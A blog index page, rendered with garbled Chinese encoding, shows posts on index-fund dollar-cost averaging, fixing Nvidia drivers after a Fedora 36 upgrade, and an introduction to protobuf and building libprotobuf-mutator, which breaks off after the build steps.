<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="å®‰å…¨ä»£ç ">
<meta property="og:url" content="http://usmacd.com/index.html">
<meta property="og:site_name" content="å®‰å…¨ä»£ç ">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="henices">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://usmacd.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>å®‰å…¨ä»£ç </title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="å®‰å…¨ä»£ç " type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">å®‰å…¨ä»£ç </h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="henices"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">henices</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/henices" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;henices" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/henices" title="Weibo â†’ https:&#x2F;&#x2F;weibo.com&#x2F;henices" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/henices" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS â†’ &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">é£èŠ±å ‚</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://chensenlin.cn/" title="https:&#x2F;&#x2F;chensenlin.cn&#x2F;" rel="noopener" target="_blank">ä½ å¥½æˆ‘æ˜¯æ£®æ—</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/06/17/Automatic_Investment_Plan/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/17/Automatic_Investment_Plan/" class="post-title-link" itemprop="url">å…³äºå®šæŠ•çš„ä¸€äº›æ€è€ƒ</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-17 10:49:02" itemprop="dateCreated datePublished" datetime="2022-06-17T10:49:02+08:00">2022-06-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <ul>
<li>å®šæŠ•åªæœ‰åœ¨ä½ä¼°çš„æ—¶å€™ä¹°ï¼Œå½“ä¼°å€¼è¿›å…¥ä¸­ä½æ•°ä»¥ä¸Šå°±ä¸è¦ä¹°äº†ï¼ŒåŒæ—¶å®šæŠ•æ ‡çš„çš„ä¼°å€¼åº”è¯¥åœ¨å†å²åº•éƒ¨åŒºåŸŸã€‚</li>
<li>å®šæŠ•çš„æœ¬è´¨ä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œè€Œæ˜¯ç›¸ä¿¡ä¼°å€¼å›å½’ä¸­ä½æ•°ã€‚ </li>
<li>æŒ‡æ•°åŸºé‡‘ï¼Œå‘¨æœŸæ€§è¡Œä¸šé€‚åˆå®šæŠ•ï¼Œæ¯”å¦‚åˆ¸å•†ï¼Œé’¢é“ï¼Œç…¤ç‚­ã€‚ä¸€èˆ¬æŒ‰æ—¶é—´å®šæŠ•ï¼Œå¦‚æœå¤§å¹…ä¸‹è·Œä¹Ÿè¦ä¹°ã€‚</li>
</ul>
<p>æ€»çš„æ¥è¯´å®šæŠ•å±äºç­–ç•¥å‹çš„æŠ•èµ„æ–¹æ³•ï¼Œå…¶å®å¹¶ä¸çŸ¥é“åº•å’Œé¡¶åœ¨å“ªé‡Œï¼Œé€šè¿‡æ‹‰é•¿æ—¶é—´æ¥é™ä½æŒä»“æˆæœ¬ï¼Œå› æ­¤å®šæŠ•æˆåŠŸçš„å…³é”®åœ¨äºä½ çš„æˆæœ¬æ˜¯å¦å¯ä»¥éšç€æ—¶é—´è€Œé™ä¸‹æ¥ã€‚ä»è¿™ç‚¹ä¹Ÿå¯ä»¥åˆ†æå‡ºåœ¨åº•éƒ¨åŒºåŸŸå®šæŠ•æ¯”åœ¨é¡¶éƒ¨åŒºåŸŸå®šæŠ•è¦å¥½å¾—å¤šï¼Œè¿™ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¡ã€‚</p>
<p>å®šæŠ•ç­–ç•¥å¯¹å†å²çš„ä¼°å€¼æƒ…å†µæœ‰å¾ˆå¼ºçš„ä¾èµ–ï¼Œå±äºåŸºäºå†å²æ•°æ®çš„ç»Ÿè®¡åˆ†æï¼Œä½†æ˜¯æ¯ä¸€æ¬¡çš„æƒ…å†µéƒ½ä¸åŒï¼Œæ²¡æœ‰äººå¯ä»¥ä¿è¯å†å²ä¸€å®šä¼šé‡æ¼”ã€‚å®šæŠ•ä¹Ÿä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œæ²¡æœ‰æŠ¤åŸæ²³ï¼Œåªæ˜¯ç›¸ä¿¡å‡å€¼å›å½’ï¼Œè¿™æ˜¯ç¬¬äºŒæ¡ã€‚</p>
<p>å·´è²ç‰¹éå¸¸æ¨èæ ‡æ™®500æŒ‡æ•° (S&amp;P 500) å®šæŠ•ï¼ŒæŒ‡æ•°åŸºé‡‘æœ€ç‰›çš„åœ°æ–¹æ˜¯è‚¡ç¥¨ä¼šå®šæœŸè°ƒæ•´ï¼ŒæŠŠå¥½çš„è‚¡ç¥¨åŠ å…¥è¿›æ¥ï¼Œå·®çš„æ·˜æ±°å‡ºå»ï¼Œç›¸å½“äºæœ‰äººå¸®ä½ é€‰è‚¡äº†ï¼Œå¦å¤–è¶³å¤Ÿåˆ†æ•£ï¼Œå‘ç”Ÿç³»ç»Ÿæ€§é£é™©çš„æ¦‚ç‡å¤§å¹…é™ä½ã€‚å‘¨æœŸæ€§è¡Œä¸šåˆ™æ˜¯çˆ†å‘æ€§æ€§å¾ˆå¼ºï¼Œä¸‰å¹´ä¸å¼€å¼ ï¼Œå¼€å¼ åƒä¸‰å¹´ï¼Œå®¹æ˜“åœ¨åº•éƒ¨ç§¯ç´¯å¤§é‡ç­¹ç ï¼Œä½œä¸ºä¸€ä¸ªé•¿æœŸæŠ•èµ„ç­–ç•¥éå¸¸åˆé€‚ã€‚</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/16/Fedora36-Nvidia/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/16/Fedora36-Nvidia/" class="post-title-link" itemprop="url">å‡çº§ Fedora 36ï¼Œé‡ä¸Š Nvidia é©±åŠ¨é—®é¢˜</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-16 16:58:37" itemprop="dateCreated datePublished" datetime="2022-05-16T16:58:37+08:00">2022-05-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Fedora 36 æ­£å¼ç‰ˆå·²ç»é‡Šå‡ºä¸€æ®µæ—¶é—´äº†ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒå¼€å§‹çš„ä¸€å‘¨éƒ½ä¼šæœ‰ bugï¼Œä¸€èˆ¬ç­‰ä¸€æ®µæ—¶é—´å†å‡çº§ä¼šæ›´å¹³æ»‘ä¸€äº›ã€‚ç„¶è€Œï¼Œè€é©å‘½åˆé‡ä¸Šäº†æ–°é—®é¢˜ï¼Œæ˜¾ç¤ºå‡ºé—®é¢˜äº†å¯åŠ¨ä¸èµ·æ¥ã€‚æˆ‘å·²ç»å¾ˆä¹…æ²¡æœ‰é‡ä¸Šæ˜¾ç¤ºé©±åŠ¨é—®é¢˜äº†ï¼Œæˆ‘åœ¨å¾ˆä¹…ä»¥å‰å°±ç¦ç”¨äº†å¼€æºé©±åŠ¨ <code>nouveau</code>ï¼Œä¸€ç›´éƒ½ç”¨å¾—å¾ˆå¥½ã€‚</p>
<p>ä¿®æ”¹ &#x2F;etc&#x2F;default&#x2F;grub æ–‡ä»¶ï¼Œåœ¨ <code>GRUB_CMDLINE_LINUX</code> æ·»åŠ ä¸‹é¢å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure>

<p>é‡æ–°ç”Ÿæˆ grub æ–‡ä»¶ï¼Œ <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>ï¼Œä½†æ˜¯åœ¨å‡çº§ Fedora 36 åä¼¼ä¹æ²¡æœ‰èµ·ä½œç”¨ã€‚è¯¡å¼‚çš„æ˜¯ Fedora 35 çš„å†…æ ¸å´å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œé¦–å…ˆæ€€ç–‘çš„æ˜¯ nvidia é©±åŠ¨å¯èƒ½æ²¡æœ‰å®‰è£…å¯¹ã€‚æ‰§è¡Œä¸‹é¢å‘½ä»¤è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

<p>å¯æƒœæ²¡æœ‰è§£å†³é—®é¢˜ï¼Œä¸Šç½‘æ‰¾èµ„æ–™çœ‹çœ‹ Fedora 36 æœ‰æ²¡ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ã€‚å®‰è£… Nvidia é©±åŠ¨ç½‘ä¸Šæœ‰è¿™ç¯‡æ–‡ç« è¯´çš„è¯¦ç»†<br><a target="_blank" rel="noopener" href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>ä»”ç»†æ‹œè¯»äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ²¡æœ‰å‘ç°å•¥é—®é¢˜ï¼Œé©±åŠ¨ä¹Ÿé‡æ–°å®‰è£…äº†å•Šï¼Œå¼€å§‹æ€€ç–‘æ˜¯æ–°ç‰ˆ Nvidia é©±åŠ¨çš„é—®é¢˜</p>
<p><code>sudo dnf search xorg-x11-drv-nvidia</code> å¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„é©±åŠ¨ï¼Œ<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> ä¸çŸ¥é“åˆ°åº•éœ€è¦å®‰è£…å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ã€‚ğŸ˜­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards</span><br><span class="line">=========================================================================== åç§° å’Œ æ¦‚å†µ åŒ¹é…ï¼šxorg-x11-drv-nvidia</span><br><span class="line">xorg-x11-drv-nvidia-340xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.i686 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-340xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.i686 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-390xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.i686 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-470xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-470xx</span><br></pre></td></tr></table></figure>

<p>å¯æ˜¯ä»”ç»†ä¸€ç¢ç£¨ï¼Œ Fedora 35 Nvidia é©±åŠ¨ä¸æ˜¯å·¥ä½œæ­£å¸¸å—ï¼Œå¯ä»¥ä¸Šå»çœ‹çœ‹ç”¨çš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ <code>nvidia-settings</code>,åœ¨ System Information ä¸­å‘ç°ä½¿ç”¨çš„å°±æ˜¯æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ <strong>510.68.02</strong>ï¼Œçœ‹æ ·å­æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œä¸€ä¸‹é™·å…¥äº†å›°å¢ƒã€‚ğŸ˜°</p>
<p>æ²¡å•¥å¥½åŠæ³•ï¼Œè¿˜æ˜¯ Google æœç´¢ä¸€ä¸‹ï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªé“¾æ¥åœ¨è®¨è®ºè¿™ä¸ªé—®é¢˜ï¼Œå’Œæˆ‘é‡ä¸Šçš„ç°è±¡ä¸€æ ·ï¼Œä½œè€…æœ€ç»ˆè§£å†³äº†é—®é¢˜<br><a target="_blank" rel="noopener" href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p>
<p>åŸæ¥æ˜¯æ—§ç‰ˆçš„é©±åŠ¨æ²¡æœ‰å¸è½½å¹²å‡€ï¼Œå‚è€ƒ <a target="_blank" rel="noopener" href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>é©±åŠ¨å¸è½½ Nvidia é©±åŠ¨éœ€è¦ä½¿ç”¨å‘½ä»¤ <code>dnf remove xorg-x11-drv-nvidia\*</code></p>
<p>æŒ‰ç…§ä¸‹é¢çš„å‘½ä»¤æ“ä½œäº†ä¸€éï¼Œé‡å¯ç³»ç»Ÿï¼Œç†Ÿæ‚‰çš„ç™»å½•ç•Œé¢ç»ˆäºåˆå‡ºç°äº†ã€‚ğŸ˜„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf remove xorg-x11-drv-nouveau</span><br><span class="line">sudo dnf remove xorg-x11-drv-nvidia\*</span><br><span class="line">sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/11/libprotobuf-mutator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/11/libprotobuf-mutator/" class="post-title-link" itemprop="url">libprotobuf-mutator ç®€å•åˆ†æ</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-11 15:26:12" itemprop="dateCreated datePublished" datetime="2022-05-11T15:26:12+08:00">2022-05-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="What-are-protocol-buffers"><a href="#What-are-protocol-buffers" class="headerlink" title="What are protocol buffers?"></a><a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/overview">What are protocol buffers?</a></h2><p>Protocol buffers are Googleâ€™s language-neutral, platform-neutral, extensible mechanism for serializing structured data â€“ think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p>
<p>è¿™æ®µæ˜¯ Google å®˜æ–¹ç½‘ç«™ç»™å‡ºçš„ä»‹ç»ï¼Œprotobuf å¯ä»¥è‡ªåŠ¨åŒ–ç”Ÿæˆä»£ç ï¼Œç”¨äºè¯»å…¥æˆ–è€…å†™å…¥ç»“æ„åŒ–æ•°æ®ã€‚ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶å¯ä»¥æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…·ä½“çš„è¯­æ³•å¯ä»¥å‚è€ƒGoogle çš„æ–‡æ¡£ <a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/proto">proto2</a> å’Œ <a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/proto3">proto3</a>ã€‚c++ è¯­è¨€ä½¿ç”¨ protobuf çš„ç¤ºä¾‹å¯ä»¥å‚è§<a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/cpptutorial">Protocol Buffer Basics: C++</a> æ–‡æ¡£ï¼ŒåŸºæœ¬æ­¥éª¤æ€»ç»“å¦‚ä¸‹ï¼š</p>
<ol>
<li>å†™ protobuf æ–‡ä»¶ï¼Œè¡¨è¾¾æ•°æ®ç»“æ„</li>
<li>åˆ©ç”¨ protoc è‡ªåŠ¨ç”Ÿæˆä»£ç  ï¼ˆæ”¯æŒå¤šç§è¯­è¨€ C++ Java ç­‰ï¼‰</li>
<li>åˆ©ç”¨ç”Ÿæˆçš„æ–‡ä»¶è§£ææˆ–è€…å†™å…¥ç›¸å…³æ•°æ®ç»“æ„</li>
</ol>
<h2 id="libprotobuf-mutator"><a href="#libprotobuf-mutator" class="headerlink" title="libprotobuf-mutator"></a>libprotobuf-mutator</h2><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><p>å‚è€ƒï¼š <a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/blob/master/README.md">https://github.com/google/libprotobuf-mutator/blob/master/README.md</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/libprotobuf-mutator.git</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br><span class="line">https_proxy=http://127.0.0.1:3128 ninja check</span><br></pre></td></tr></table></figure>

